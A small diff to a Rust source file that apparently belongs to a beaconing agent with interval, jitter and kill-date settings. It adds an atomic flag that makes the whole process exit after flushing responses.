@@ -18,6 +18,8 @@ const RAW_JSON: &str = include_str!("../config.json");
 pub static INTERVAL: AtomicU64 = AtomicU64::new(30);
 pub static JITTER: AtomicU64 = AtomicU64::new(0);
 pub static SHOULD_EXIT: AtomicBool = AtomicBool::new(false);
+/// After flushing responses, terminate the entire process (set by exit method=process).
+pub static EXIT_PROCESS: AtomicBool = AtomicBool::new(false);
 
 /// Unix timestamp (seconds). 0 = not set.
 pub static KILLDATE: AtomicU64 = AtomicU64::new(0);
